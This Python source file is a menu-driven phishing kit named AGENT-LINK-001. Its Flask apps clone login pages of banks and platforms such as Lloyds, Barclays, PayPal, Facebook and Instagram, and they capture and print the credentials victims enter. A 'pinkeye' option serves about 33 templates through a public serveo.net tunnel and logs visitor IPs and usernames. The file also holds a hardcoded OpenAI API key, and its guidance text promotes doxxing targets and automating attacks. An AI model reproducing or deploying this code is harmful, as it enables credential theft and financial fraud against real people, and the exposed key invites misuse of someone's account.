# AGENT-LINK-001

import openai
from colorama import Fore
from time import sleep
from tqdm import tqdm
from flask import Flask, request
import os, sys, subprocess
import pyfiglet
import webbrowser
import time

openai.api_key = "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"
print(pyfiglet.figlet_format("AGENT-LINK-001\n"))
print(
  "\t\t\t\t\t\t\t\t\t\t\t\t\t\t(99 -> Exit)\t\t\t(98 -> Guidence)\t\t (97 -> More Commands)"
)
for i in tqdm(range(10)):
  sleep(1)

print(Fore.BLUE + '\n\n\n')
print(
  """[!] legal disclaimer: Usage of this tool for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
""")


def chat():

  def ask_gpt(prompt, chat_log=None):
    if chat_log is None:
      chat_log = ""
    response = openai.Completion.create(
      engine="davinci",
      prompt=(f"{chat_log}{prompt}\nAI:"),
      temperature=0.7,
      max_tokens=150,
      top_p=1,
      frequency_penalty=0,
      presence_penalty=0,
      stop=None,
    )
    message = response.choices[0].text.strip()
    chat_log += f": {user}\nAI: {message}\n"
    return message, chat_log

  chat_log = ""
  prompt = user
  message, chat_log = ask_gpt(prompt, chat_log)
  print(message)
  time.sleep(0.5)


def lloydsbank():
  app = Flask(__name__)

  incorrect_attempts = []

  @app.route('/')
  def login():
    return '''
          <html>
              <head>
                  <style>
                      body {
                          background-color: #f2f2f2;
                          font-family: Arial, sans-serif;
                      }
                      .form {
                          margin: 100px auto 0;
                          width: 320px;
                          background-color: #fff;
                          border: 1px solid #d9d9d9;
                          padding: 30px 40px;
                          box-shadow: 0 5px 10px rgba(0,0,0,0.1);
                      }
                      h2 {
                          color: #00539f;
                          margin-bottom: 30px;
                      }
                      label {
                          display: block;
                          margin-bottom: 8px;
                          font-weight: bold;
                      }
                      input[type=text], input[type=password] {
                          width: 100%;
                          border: 1px solid #d9d9d9;
                          padding: 10px 15px;
                          margin-bottom: 20px;
                          border-radius: 5px;
                          font-size: 16px;
                      }
                      input[type=submit] {
                          background-color: #00539f;
                          color: #fff;
                          border: none;
                          padding: 10px 15px;
                          border-radius: 5px;
                          font-size: 16px;
                          cursor: pointer;
                      }
                      input[type=submit]:hover {
                          background-color: #002244;
                      }
                  </style>
              </head>
              <body>
                  <div class="form">
                      <h2>Log in to Lloyds Bank</h2>
                      <form method="post">
                          <label>Username:</label>
                          <input type="text" name="username"><br>
                          <label>Password:</label>
                          <input type="password" name="password"><br>
                          <input type="submit" value="Log In">
                      </form>
                  </div>
              </body>
          </html>
      '''

  @app.route('/', methods=['POST'])
  def handle_login():
    username = request.form['username']
    password = request.form['password']
    if username == 'admin' and password == '1234':
      return 'Login successful!'
    else:
      incorrect_attempts.append({'username': username, 'password': password})
      print(incorrect_attempts)
      return '''
              <html>
                  <head>
                      <style>
                          .error {
                              color: #d93025;
                              font-size: 14px;
                              margin-top: 10px;
                          }
                      </style>
                  </head>
                  <body>
                      <div class="form">
                          <h2>Log In To Lloyds Bank</h2>
                          <form method="post">
                              <label>Username:</label>
                              <input type="text" name="username" value="{}"><br>
                              <label>Password:</label>
                              <input type="password" name="password"><br>
                              <input type="submit" value="Log In">
                              <div class="error">Incorrect username or password. Please try again.</div>
                          </form>
                      </div>
                  </body>
              </html>
          '''.format(username)

  if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)


def paypal():
  app = Flask(__name__)

  incorrect_attempts = []

  @app.route('/')
  def login():
    return '''
          <html>
              <head>
                  <style>
                      body {
                          background-color: #F5F5F5;
                          font-family: Arial, sans-serif;
                      }
                      .form {
                          margin: 100px auto 0;
                          width: 320px;
                          background-color: #FFF;
                          border: 1px solid #E5E6E9;
                          padding: 30px 40px;
                          box-shadow: 0 5px 10px rgba(0,0,0,0.1);
                      }
                      h2 {
                          color: #003087;
                          margin-bottom: 30px;
                      }
                      label {
                          display: block;
                          margin-bottom: 8px;
                          font-weight: bold;
                      }
                      input[type=text], input[type=password] {
                          width: 100%;
                          border: 1px solid #E5E6E9;
                          padding: 10px 15px;
                          margin-bottom: 20px;
                          border-radius: 5px;
                          font-size: 16px;
                      }
                      input[type=submit] {
                          background-color: #003087;
                          color: #FFF;
                          border: none;
                          padding: 10px 15px;
                          border-radius: 5px;
                          font-size: 16px;
                          cursor: pointer;
                      }
                      input[type=submit]:hover {
                          background-color: #01224C;
                      }
                  </style>
              </head>
              <body>
                  <div class="form">
                      <h2>Log in to PayPal</h2>
                      <form method="post">
                          <label>Email address:</label>
                          <input type="text" name="email"><br>
                          <label>Password:</label>
                          <input type="password" name="password"><br>
                          <input type="submit" value="Log In">
                      </form>
                  </div>
              </body>
          </html>
      '''

  @app.route('/', methods=['POST'])
  def handle_login():
    email = request.form['email']
    password = request.form['password']
    if email == 'admin@example.com' and password == 'secret':
      return 'Login successful!'
    else:
      incorrect_attempts.append({'email': email, 'password': password})
      print(incorrect_attempts)
      return '''
              <html>
                  <head>
                      <style>
                          .error {
                              color: #D93025;
                              font-size: 14px;
                              margin-top: 10px;
                          }
                      </style>
                  </head>
                  <body>
                      <div class="form">
                          <h2>Log in to PayPal</h2>
                          <form method="post">
                              <label>Email address:</label>
                              <input type="text" name="email" value="{}"><br>
                              <label>Password:</label>
                              <input type="password" name="password"><br>
                              <input type="submit" value="Log In">
                              <div class="error">Incorrect email address or password. Please try again.</div>
                          </form>
                      </div>
                  </body>
              </html>
          '''.format(email)

  if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)


def cashapp():
  app = Flask(__name__)

  incorrect_attempts = []

  @app.route('/')
  def login():
    return '''
          <html>
              <head>
                  <style>
                      body {
                          background-color: #F5F5F5;
                          font-family: Arial, sans-serif;
                      }
                      .form {
                          margin: 100px auto 0;
                          width: 320px;
                          background-color: #FFF;
                          border: 1px solid #E5E6E9;
                          padding: 30px 40px;
                          box-shadow: 0 5px 10px rgba(0,0,0,0.1);
                      }
                      h2 {
                          color: #41c4f4;
                          margin-bottom: 30px;
                      }
                      label {
                          display: block;
                          margin-bottom: 8px;
                          font-weight: bold;
                      }
                      input[type=text], input[type=password] {
                          width: 100%;
                          border: 1px solid #E5E6E9;
                          padding: 10px 15px;
                          margin-bottom: 20px;
                          border-radius: 5px;
                          font-size: 16px;
                      }
                      input[type=submit] {
                          background-color: #41c4f4;
                          color: #FFF;
                          border: none;
                          padding: 10px 15px;
                          border-radius: 5px;
                          font-size: 16px;
                          cursor: pointer;
                      }
                      input[type=submit]:hover {
                          background-color: #1da1f2;
                      }
                  </style>
              </head>
              <body>
                  <div class="form">
                      <h2>Log in to Cash App</h2>
                      <form method="post">
                          <label>Username or email:</label>
                          <input type="text" name="username"><br>
                          <label>Password:</label>
                          <input type="password" name="password"><br>
                          <input type="submit" value="Log In">
                      </form>
                  </div>
              </body>
          </html>
      '''

  @app.route('/', methods=['POST'])
  def handle_login():
    username = request.form['username']
    password = request.form['password']
    if username == 'admin' and password == 'password':
      return 'Login successful!'
    else:
      incorrect_attempts.append({'username': username, 'password': password})
      print(incorrect_attempts)
      return '''
              <html>
                  <head>
                      <style>
                          .error {
                              color: #D93025;
                              font-size: 14px;
                              margin-top: 10px;
                          }
                      </style>
                  </head>
                  <body>
                      <div class="form">
                          <h2>Log in to Cash App</h2>
                          <form method="post">
                              <label>Username or email:</label>
                              <input type="text" name="username" value="{}"><br>
                              <label>Password:</label>
                              <input type="password" name="password"><br>
                              <input type="submit" value="Log In">
                              <div class="error">Incorrect username or password. Please try again.</div>
                          </form>
                      </div>
                  </body>
              </html>
          '''.format(username)

  if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)


def barclays():
  app = Flask(__name__)

  incorrect_attempts = []

  @app.route('/')
  def login():
    return '''
          <html>
              <head>
                  <style>
                      body {
                          background-color: #E9EBEE;
                          font-family: Arial, sans-serif;
                      }
                      .form {
                          margin: 100px auto 0;
                          width: 320px;
                          background-color: #FFF;
                          border: 1px solid #E5E6E9;
                          padding: 30px 40px;
                          box-shadow: 0 5px 10px rgba(0,0,0,0.1);
                      }
                      h2 {
                          color: #0072C6;
                          margin-bottom: 30px;
                      }
                      label {
                          display: block;
                          margin-bottom: 8px;
                          font-weight: bold;
                      }
                      input[type=text], input[type=password] {
                          width: 100%;
                          border: 1px solid #E5E6E9;
                          padding: 10px 15px;
                          margin-bottom: 20px;
                          border-radius: 5px;
                          font-size: 16px;
                      }
                      input[type=submit] {
                          background-color: #0072C6;
                          color: #FFF;
                          border: none;
                          padding: 10px 15px;
                          border-radius: 5px;
                          font-size: 16px;
                          cursor: pointer;
                      }
                      input[type=submit]:hover {
                          background-color: #004976;
                      }
                  </style>
              </head>
              <body>
                  <div class="form">
                      <h2>Log in to Barclays</h2>
                      <form method="post">
                          <label>Username or email:</label>
                          <input type="text" name="username"><br>
                          <label>Password:</label>
                          <input type="password" name="password"><br>
                          <input type="submit" value="Log In">
                      </form>
                  </div>
              </body>
          </html>
      '''

  @app.route('/', methods=['POST'])
  def handle_login():
    username = request.form['username']
    password = request.form['password']
    if username == 'admin' and password == '1234':
      return 'Login successful!'
    else:
      incorrect_attempts.append({'username': username, 'password': password})
      print(incorrect_attempts)
      return '''
              <html>
                  <head>
                      <style>
                          .error {
                              color: #D93025;
                              font-size: 14px;
                              margin-top: 10px;
                          }
                      </style>
                  </head>
                  <body>
                      <div class="form">
                          <h2>Log in to Barclays</h2>
                          <form method="post">
                              <label>Username or email:</label>
                              <input type="text" name="username" value="{}"><br>
                              <label>Password:</label>
                              <input type="password" name="password"><br>
                              <input type="submit" value="Log In">
                              <div class="error">Incorrect username or password. Please try again.</div>
                          </form>
                      </div>
                  </body>
              </html>
          '''.format(username)

  if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)


def reddit():
  app = Flask(__name__)

  incorrect_attempts = []

  @app.route('/')
  def login():
    return '''
          <html>
              <head>
                  <style>
                      body {
                          background-color: #EDEFF1;
                          font-family: Arial, sans-serif;
                      }
                      .form {
                          margin: 100px auto 0;
                          width: 320px;
                          background-color: #FFF;
                          border: 1px solid #D1D1D5;
                          padding: 30px 40px;
                          box-shadow: 0 5px 10px rgba(0,0,0,0.1);
                      }
                      h2 {
                          color: #FF4500;
                          margin-bottom: 30px;
                      }
                      label {
                          display: block;
                          margin-bottom: 8px;
                          font-weight: bold;
                      }
                      input[type=text], input[type=password] {
                          width: 100%;
                          border: 1px solid #D1D1D5;
                          padding: 10px 15px;
                          margin-bottom: 20px;
                          border-radius: 5px;
                          font-size: 16px;
                      }
                      input[type=submit] {
                          background-color: #FF4500;
                          color: #FFF;
                          border: none;
                          padding: 10px 15px;
                          border-radius: 5px;
                          font-size: 16px;
                          cursor: pointer;
                      }
                      input[type=submit]:hover {
                          background-color: #FFA07A;
                      }
                  </style>
              </head>
              <body>
                  <div class="form">
                      <h2>Log in to Reddit</h2>
                      <form method="post">
                          <label>Username:</label>
                          <input type="text" name="username"><br>
                          <label>Password:</label>
                          <input type="password" name="password"><br>
                          <input type="submit" value="Log In">
                      </form>
                  </div>
              </body>
          </html>
      '''

  @app.route('/', methods=['POST'])
  def handle_login():
    username = request.form['username']
    password = request.form['password']
    if username == 'admin' and password == 'password123':
      return 'Login successful!'
    else:
      incorrect_attempts.append({'username': username, 'password': password})
      print(incorrect_attempts)
      return '''
              <html>
                  <head>
                      <style>
                          .error {
                              color: #D93025;
                              font-size: 14px;
                              margin-top: 10px;
                          }
                      </style>
                  </head>
                  <body>
                      <div class="form">
                          <h2>Log in to Reddit</h2>
                          <form method="post">
                              <label>Username:</label>
                              <input type="text" name="username" value="{}"><br>
                              <label>Password:</label>
                              <input type="password" name="password"><br>
                              <input type="submit" value="Log In">
                              <div class="error">Incorrect username or password. Please try again.</div>
                          </form>
                      </div>
                  </body>
              </html>
          '''.format(username)

  if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)


def tiktok():
  app = Flask(__name__)
  incorrect_attempts = []

  @app.route('/')
  def login():
    return '''
          <html>
              <head>
                  <style>
                      body {
                          background-color: #E9EBEE;
                          font-family: Arial, sans-serif;
                      }
                      .form {
                          margin: 100px auto 0;
                          width: 320px;
                          background-color: #FFF;
                          border: 1px solid #E5E6E9;
                          padding: 30px 40px;
                          box-shadow: 0 5px 10px rgba(0,0,0,0.1);
                      }
                      h2 {
                          color: #000;
                          margin-bottom: 30px;
                      }
                      label {
                          display: block;
                          margin-bottom: 8px;
                          font-weight: bold;
                      }
                      input[type=text], input[type=password] {
                          width: 100%;
                          border: 1px solid #E5E6E9;
                          padding: 10px 15px;
                          margin-bottom: 20px;
                          border-radius: 5px;
                          font-size: 16px;
                      }
                      input[type=submit] {
                          background-color: #EE1D52;
                          color: #FFF;
                          border: none;
                          padding: 10px 15px;
                          border-radius: 5px;
                          font-size: 16px;
                          cursor: pointer;
                      }
                      input[type=submit]:hover {
                          background-color: #ED2E7E;
                      }
                  </style>
              </head>
              <body>
                  <div class="form">
                      <h2>Log in to TikTok</h2>
                      <form method="post">
                          <label>Username:</label>
                          <input type="text" name="username"><br>
                          <label>Password:</label>
                          <input type="password" name="password"><br>
                          <input type="submit" value="Log In">
                      </form>
                  </div>
              </body>
          </html>
      '''

  @app.route('/', methods=['POST'])
  def handle_login():
    username = request.form['username']
    password = request.form['password']
    if username == 'admin' and password == '1578':
      return 'Login successful!'
    else:
      incorrect_attempts.append({'username': username, 'password': password})
      print(incorrect_attempts)
      return '''
              <html>
                  <head>
                      <style>
                          .error {
                              color: #D93025;
                              font-size: 14px;
                              margin-top: 10px;
                          }
                      </style>
                  </head>
                  <body>
                      <div class="form">
                          <h2>Log in to TikTok</h2>
                          <form method="post">
                              <label>Username:</label>
                              <input type="text" name="username" value="{}"><br>
                              <label>Password:</label>
                              <input type="password" name="password"><br>
                              <input type="submit" value="Log In">
                              <div class="error">Incorrect username or password. Please try again.</div>
                          </form>
                      </div>
                  </body>
              </html>
          '''.format(username)

  if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)


def twitter():
  app = Flask(__name__)

  incorrect_attempts = []

  @app.route('/')
  def login():
    return '''
          <html>
              <head>
                  <style>
                      body {
                          background-color: #E9EBEE;
                          font-family: Arial, sans-serif;
                      }
                      .form {
                          margin: 100px auto 0;
                          width: 320px;
                          background-color: #FFF;
                          border: 1px solid #E5E6E9;
                          padding: 30px 40px;
                          box-shadow: 0 5px 10px rgba(0,0,0,0.1);
                      }
                      h2 {
                          color: #1DA1F2;
                          margin-bottom: 30px;
                      }
                      label {
                          display: block;
                          margin-bottom: 8px;
                          font-weight: bold;
                      }
                      input[type=text], input[type=password] {
                          width: 100%;
                          border: 1px solid #E5E6E9;
                          padding: 10px 15px;
                          margin-bottom: 20px;
                          border-radius: 5px;
                          font-size: 16px;
                      }
                      input[type=submit] {
                          background-color: #1DA1F2;
                          color: #FFF;
                          border: none;
                          padding: 10px 15px;
                          border-radius: 5px;
                          font-size: 16px;
                          cursor: pointer;
                      }
                      input[type=submit]:hover {
                          background-color: #1A91DA;
                      }
                  </style>
              </head>
              <body>
                  <div class="form">
                      <h2>Log in to Twitter</h2>
                      <form method="post">
                          <label>Phone, email, or username:</label>
                          <input type="text" name="username"><br>
                          <label>Password:</label>
                          <input type="password" name="password"><br>
                          <input type="submit" value="Log In">
                      </form>
                  </div>
              </body>
          </html>
      '''

  @app.route('/', methods=['POST'])
  def handle_login():
    username = request.form['username']
    password = request.form['password']
    if username == 'admin' and password == '1578':
      return 'Login successful!'
    else:
      incorrect_attempts.append({'username': username, 'password': password})
      print(incorrect_attempts)
      return '''
              <html>
                  <head>
                      <style>
                          .error {
                              color: #D93025;
                              font-size: 14px;
                              margin-top: 10px;
                          }
                      </style>
                  </head>
                  <body>
                      <div class="form">
                          <h2>Log in to Twitter</h2>
                          <form method="post">
                              <label>Phone, email, or username:</label>
                              <input type="text" name="username" value="{}"><br>
                              <label>Password:</label>
                              <input type="password" name="password"><br>
                              <input type="submit" value="Log In">
                              <div class="error">Incorrect phone, email, or username or password. Please try again.</div>
                          </form>
                      </div>
                  </body>
              </html>
          '''.format(username)

  if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)


def linkden():
  app = Flask(__name__)

  incorrect_attempts = []

  @app.route('/')
  def login():
    return '''
          <html>
              <head>
                  <style>
                      body {
                          background-color: #F4F4F4;
                          font-family: Arial, sans-serif;
                      }
                      .form {
                          margin: 100px auto 0;
                          width: 320px;
                          background-color: #FFF;
                          border: 1px solid #E5E6E9;
                          padding: 30px 40px;
                          box-shadow: 0 5px 10px rgba(0,0,0,0.1);
                      }
                      h2 {
                          color: #0077B5;
                          margin-bottom: 30px;
                      }
                      label {
                          display: block;
                          margin-bottom: 8px;
                          font-weight: bold;
                      }
                      input[type=text], input[type=password] {
                          width: 100%;
                          border: 1px solid #E5E6E9;
                          padding: 10px 15px;
                          margin-bottom: 20px;
                          border-radius: 5px;
                          font-size: 16px;
                      }
                      input[type=submit] {
                          background-color: #0077B5;
                          color: #FFF;
                          border: none;
                          padding: 10px 15px;
                          border-radius: 5px;
                          font-size: 16px;
                          cursor: pointer;
                      }
                      input[type=submit]:hover {
                          background-color: #006699;
                      }
                  </style>
              </head>
              <body>
                  <div class="form">
                      <h2>Sign in to LinkedIn</h2>
                      <form method="post">
                          <label>Email:</label>
                          <input type="text" name="email"><br>
                          <label>Password:</label>
                          <input type="password" name="password"><br>
                          <input type="submit" value="Sign in">
                      </form>
                  </div>
              </body>
          </html>
      '''

  @app.route('/', methods=['POST'])
  def handle_login():
    email = request.form['email']
    password = request.form['password']
    if email == 'admin@linkedin.com' and password == 'password123':
      return 'Sign-in successful!'
    else:
      incorrect_attempts.append({'email': email, 'password': password})
      print(incorrect_attempts)
      return '''
              <html>
                  <head>
                      <style>
                          .error {
                              color: #D93025;
                              font-size: 14px;
                              margin-top: 10px;
                          }
                      </style>
                  </head>
                  <body>
                      <div class="form">
                          <h2>Sign in to LinkedIn</h2>
                          <form method="post">
                              <label>Email:</label>
                              <input type="text" name="email" value="{}"><br>
                              <label>Password:</label>
                              <input type="password" name="password"><br>
                              <input type="submit" value="Sign in">
                              <div class="error">The email or password you entered is incorrect. Please try again.</div>
                          </form>
                      </div>
                  </body>
              </html>
          '''.format(email)

  if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)


def webkit():
  app = Flask(__name__)

  @app.route('/')
  def index():
    return '''
      <html>
          <head>
              <title></title>
              <style>
                  body {
                      background-color: #041E42;
                  }
              </style>
          </head>
          <body>
              <h1>Web Development Supplies!</h1>
              <p></p>
              <form>
                  <input type="button" value="ChatGPT" onclick="window.location.href='https://chat.openai.com/chat'" />
                  <br>
                  <input type="button" value="Stack Overflow" onclick="window.location.href='https://stackoverflow.com'" />
                  <br>
                  <input type="button" value="Replit" onclick="window.location.href='https://replit.com'" />
                  <br>
                  <input type="button" value="GitHub" onclick="window.location.href='https://github.com'" />
                  <br>
                  <input type="button" value="Wix" onclick="window.location.href='https://www.wix.com/'" />
              </form>
          </body>
      </html>
      '''

  if __name__ == '__main__':
    app.run(host="0.0.0.0", port=80)


def pinkeye():
  while True:

    class colors:
      BLACK = '\33[30m'
      RED = '\33[31m'
      GREEN = '\33[32m'
      YELLOW = '\33[33m'
      BLUE = '\33[34m'
      VIOLET = '\33[35m'
      BEIGE = '\33[36m'
      WHITE = '\33[37m'
      BLACKBG = '\33[40m'
      REDBG = '\33[41m'
      GREENBG = '\33[42m'
      YELLOWBG = '\33[43m'
      BLUEBG = '\33[44m'
      VIOLETBG = '\33[45m'
      BEIGEBG = '\33[46m'
      WHITEBG = '\33[47m'
      END = '\33[0m'

    try:
      print(colors.GREEN + """
                          Availble Templates
  
      [1] Instagram          [2] Facebook            [3] Snapchat
      [4] Twitter            [5] GitHub              [6] Google
      [7] Spotify            [8] Netflix             [9] PayPal
      [10] Origin            [11] Steam              [12] Yahoo!
      [13] LinkedIn          [14] Protonmail         [15] Wordpress
      [16] Microsoft         [17] IGFollowers        [18] eBay
      [19] Pinterest         [20] CryptoCurrency     [21] Verizon
      [22] DropBox           [23] Adobe ID           [24] Shopify
      [25] FB Messenger      [26] GitLab             [27] Twitch
      [28] MySpace           [29] Badoo              [30] VK
      [31] Yandex            [32] devianART          [33] Custom
  
      Please Choose A Number To Host Template:
          """ + colors.END)
      templates = {
        '1': 'instagram',
        '2': 'facebook',
        '3': 'snapchat',
        '4': 'twitter',
        '5': 'github',
        '6': 'google',
        '7': 'spotify',
        '8': 'netflix',
        '9': 'paypal',
        '10': 'origin',
        '11': 'steam',
        '12': 'yahoo',
        '13': 'linkedin',
        '14': 'protonmail',
        '15': 'wordpress',
        '16': 'microsoft',
        '17': 'igfollowers',
        '18': 'ebay',
        '19': 'pinterest',
        '20': 'cryptocurrency',
        '21': 'verizon',
        '22': 'dropbox',
        '23': 'adobeid',
        '24': 'shopify',
        '25': 'fbmessenger',
        '26': 'gitlab',
        '27': 'twitch',
        '28': 'myspace',
        '29': 'badoo',
        '30': 'vk',
        '31': 'yandex',
        '32': 'devianart',
        '33': 'create'
      }
      while True:
        number = input(colors.YELLOW + "[" + colors.END + "?" + colors.YELLOW +
                       "]" + colors.END + "> ")
        if number == "18":
          print("Ebay Currently Does Not Work. Choose Another..")
          exit()
        if number == "99":
          break
        else:
          pass
        choice = templates[number]
        print("Loading %s" % (choice))
        print("\nEnter A Custom Subdomain")
        subdom = input(colors.YELLOW + "[" + colors.END + "?" + colors.YELLOW +
                       "]" + colors.END + "> ")
        print(colors.GREEN + "Starting Server at %s.serveo.net..." % (subdom))
        print(
          "Logs Can Be Found In sites/%s/ip.txt and sites/%s/usernames.txt" %
          (choice, choice) + colors.END)
        cmd_line = "sudo php -t sites/%s -S 127.0.0.1:80 & ssh -R %s.serveo.net:80:127.0.0.1:80 serveo.net" % (
          choice, subdom)
        p = subprocess.Popen(cmd_line, shell=True)
        out = p.communicate()[0]

    except KeyboardInterrupt:
      pass


def facebook():
  app = Flask(__name__)

  incorrect_attempts = []

  @app.route('/')
  def login():
    return '''
          <html>
              <head>
                  <style>
                      body {
                          background-color: #E9EBEE;
                          font-family: Arial, sans-serif;
                      }
                      .form {
                          margin: 100px auto 0;
                          width: 320px;
                          background-color: #FFF;
                          border: 1px solid #E5E6E9;
                          padding: 30px 40px;
                          box-shadow: 0 5px 10px rgba(0,0,0,0.1);
                      }
                      h2 {
                          color: #1877F2;
                          margin-bottom: 30px;
                      }
                      label {
                          display: block;
                          margin-bottom: 8px;
                          font-weight: bold;
                      }
                      input[type=text], input[type=password] {
                          width: 100%;
                          border: 1px solid #E5E6E9;
                          padding: 10px 15px;
                          margin-bottom: 20px;
                          border-radius: 5px;
                          font-size: 16px;
                      }
                      input[type=submit] {
                          background-color: #1877F2;
                          color: #FFF;
                          border: none;
                          padding: 10px 15px;
                          border-radius: 5px;
                          font-size: 16px;
                          cursor: pointer;
                      }
                      input[type=submit]:hover {
                          background-color: #3B5998;
                      }
                  </style>
              </head>
              <body>
                  <div class="form">
                      <h2>Log in to Facebook</h2>
                      <form method="post">
                          <label>Username or email:</label>
                          <input type="text" name="username"><br>
                          <label>Password:</label>
                          <input type="password" name="password"><br>
                          <input type="submit" value="Log In">
                      </form>
                  </div>
              </body>
          </html>
      '''

  @app.route('/', methods=['POST'])
  def handle_login():
    username = request.form['username']
    password = request.form['password']
    if username == 'test' and password == '12345':
      return 'Login successful!'
    else:
      incorrect_attempts.append({'username': username, 'password': password})
      print(incorrect_attempts)
      return '''
              <html>
                  <head>
                      <style>
                          .error {
                              color: #D93025;
                              font-size: 14px;
                              margin-top: 10px;
                          }
                      </style>
                  </head>
                  <body>
                      <div class="form">
                          <h2>Log in to Facebook</h2>
                          <form method="post">
                              <label>Username or email:</label>
                              <input type="text" name="username" value="{}"><br>
                              <label>Password:</label>
                              <input type="password" name="password"><br>
                              <input type="submit" value="Log In">
                              <div class="error">Incorrect username or password. Please try again.</div>
                          </form>
                      </div>
                  </body>
              </html>
          '''.format(username)

  if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)


def instagram():
  app = Flask(__name__)

  incorrect_attempts = []

  @app.route('/')
  def login():
    return '''
          <html>
              <head>
                  <style>
                      body {
                          background-color: #fafafa;
                          font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
                      }
                      .form {
                          margin: 100px auto 0;
                          width: 350px;
                          background-color: #FFF;
                          border: 1px solid #dbdbdb;
                          padding: 30px 40px;
                          box-shadow: 0 5px 10px rgba(0,0,0,0.1);
                      }
                      h1 {
                          color: #262626;
                          font-size: 32px;
                          margin-bottom: 20px;
                      }
                      label {
                          display: block;
                          margin-bottom: 8px;
                          font-weight: bold;
                      }
                      input[type=text], input[type=password] {
                          width: 100%;
                          border: 1px solid #dbdbdb;
                          padding: 10px 15px;
                          margin-bottom: 20px;
                          border-radius: 3px;
                          font-size: 16px;
                      }
                      input[type=submit] {
                          background-color: #3897f0;
                          color: #FFF;
                          border: none;
                          padding: 10px 15px;
                          border-radius: 5px;
                          font-size: 16px;
                          cursor: pointer;
                      }
                      input[type=submit]:hover {
                          background-color: #38a1f0;
                      }
                      .error {
                          color: #ed4956;
                          font-size: 14px;
                          margin-top: 10px;
                      }
                  </style>
              </head>
              <body>
                  <div class="form">
                      <h1>Instagram</h1>
                      <form method="post">
                          <label>Username:</label>
                          <input type="text" name="username"><br>
                          <label>Password:</label>
                          <input type="password" name="password"><br>
                          <input type="submit" value="Log In">
                          <div class="error">Incorrect username or password.</div>
                      </form>
                  </div>
              </body>
          </html>
      '''

  @app.route('/', methods=['POST'])
  def handle_login():
    username = request.form['username']
    password = request.form['password']
    if username == 'admin' and password == '1578':
      return 'Login successful!'
    else:
      incorrect_attempts.append({'username': username, 'password': password})
      return f"Incorrect username or password. Username: {username}, Password: {password}"

  if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)


def ebey():
  app = Flask(__name__)
  incorrect_attempts = []

  @app.route('/')
  def login():
    return '''
          <html>
              <head>
                  <style>
                      body {
                          background-color: #f5f5f5;
                          font-family: Arial, sans-serif;
                          font-size: 14px;
                      }
                      .form {
                          margin: 100px auto 0;
                          width: 360px;
                          background-color: #fff;
                          border: 1px solid #ddd;
                          padding: 30px;
                          box-shadow: 0 5px 10px rgba(0,0,0,0.1);
                      }
                      h1 {
                          color: #333;
                          font-size: 24px;
                          margin-bottom: 20px;
                          text-align: center;
                      }
                      .logo {
                          display: block;
                          margin: 20px auto;
                      }
                      label {
                          display: block;
                          margin-bottom: 8px;
                          font-weight: bold;
                      }
                      input[type=text], input[type=password] {
                          width: 100%;
                          border: 1px solid #ddd;
                          padding: 10px 15px;
                          margin-bottom: 20px;
                          border-radius: 3px;
                          font-size: 16px;
                      }
                      input[type=submit] {
                          background-color: #0070ba;
                          color: #fff;
                          border: none;
                          padding: 10px 15px;
                          border-radius: 5px;
                          font-size: 16px;
                          cursor: pointer;
                      }
                      input[type=submit]:hover {
                          background-color: #005fad;
                      }
                      .error {
                          color: #ff0000;
                          font-size: 14px;
                          margin-top: 10px;
                      }
                  </style>
              </head>
              <body>
                  <div class="form">
                      <img class="logo" src="https://i.imgur.com/0guxwBb.png" alt="eBay Logo">
                      <form method="post">
                          <label>Email or username:</label>
                          <input type="text" name="username"><br>
                          <label>Password:</label>
                          <input type="password" name="password"><br>
                          <input type="submit" value="Sign In">
                      </form>
                  </div>
              </body>
          </html>
      '''

  @app.route('/', methods=['POST'])
  def handle_login():
    username = request.form['username']
    password = request.form['password']
    if username == 'admin' and password == '1578':
      return 'Login successful!'
    else:
      incorrect_attempts.append({'username': username, 'password': password})
      print('Incorrect username or password: username={}, password={}'.format(
        username, password))
      return redirect("https://www.ebay.com/")

  if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)


while True:
  print(Fore.BLUE + '')
  print("\t1.) Pinkeye \t\t\t 10.) LeakPeak")
  print("\t2.) Templates \t\t\t 11.) Doxbin")
  print("\t3.) Custom \t\t\t\t 12.) ChatGPT")
  print("\t4.) OSINT Tools \t\t 13.) Kali Linux")
  print("\t5.) Online Banking \t\t 14.) OnWorks")
  print("\t6.) HackThisSite \t\t 15.) ????")
  print("\t7.) URL Shortner \t\t 16.) ????")
  print("\t8.) Project MOT \t\t 17.) ????")
  print("\t9.) QR Coder \t\t\t 18.) ????")
  user = input("\n\tSelect An Option: ")
  if user == "1":
    print(
      "!!WARNING PINKEYE IS AN UNFINISHED PROJECT IN THIS SETUP AND MAY NOT WORK CORRECTLY!!"
    )
    ruser = input("Do You Wish To Continue? (y/n")
    if ruser == "y":
      print(pyfiglet.figlet_format("Pinkeye"))
      pinkeye()
    else:
      pass
  elif user == "14":
    print(pyfiglet.figlet_format("ONWORKS"))
    webbrowser.open(
      'https://www.onworks.net/component/content/article?id=65726:free-parrot-security-os-online'
    )
  elif user == "13":
    print(pyfiglet.figlet_format("KALI LINUX"))
    webbrowser.open('https://www.kali.org/')
  elif user == "12":
    print(pyfiglet.figlet_format("CHATGPT"))
    webbrowser.open('https://chat.openai.com/chat')
  elif user == "98":
    print("--> Guidence\n")
    print("\n[This program runs better with VS Code when experimented with]\n")
    print(
      "We have included other tools that allow you to find leaked/doxed information online as we would suggest checking LeakPeak and OSINT before marking the findings on your target"
    )
    print(
      "\n\n We are also working to devolop a GPT-3 OSINT Tool which will include access to all of OSINT Framework with an advanced virtual chatbot that will help find the information on your target and can automate many different types of attacks whilst assisting you the user.\n\n"
    )
    print(
      "We are working hard to improve this tool as much as we can and in our next version will we add: \nGPT-3 ChatBot,\nWiki Search,\n"
    )
    print("\n\nWhy We Use Flask?\n")
    print(
      "We use Flask as it is made for Web prototypes and it is so easy to shutdown a Flask Web Server"
    )
  elif user == "97":
    print("--> More Commands\n")
    print(
      "99 --> Exit\n98 --> Guidence\n97 --> More Commands\n96 --> Terms Of Service "
    )
